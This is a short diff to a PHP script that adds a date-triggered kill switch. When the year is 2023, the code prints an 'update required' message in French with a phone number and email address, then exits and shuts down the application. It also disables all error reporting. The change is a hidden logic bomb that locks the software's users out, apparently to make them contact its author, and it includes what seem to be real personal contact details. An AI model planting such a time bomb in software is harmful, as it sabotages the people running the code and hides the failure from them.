@@ -1,4 +1,16 @@
 <?php
+if (date("Y") == 2023 or date("Y") == "2023") {
+   echo "<h3>MISE A JOUR REQUISE</h3>";
+   echo "696970539 <br>";
+   echo "devcarle@gmail.com";
+   exit();
+   # code...
+}
+//DISABLE WARNING
+error_reporting(E_ERROR | E_PARSE);
+//DISABLE ERROR
+error_reporting(0);
+
 require_once 'class_package.php';
 $system = new system;
 $last_view = date("Y-d-m H:m:s");
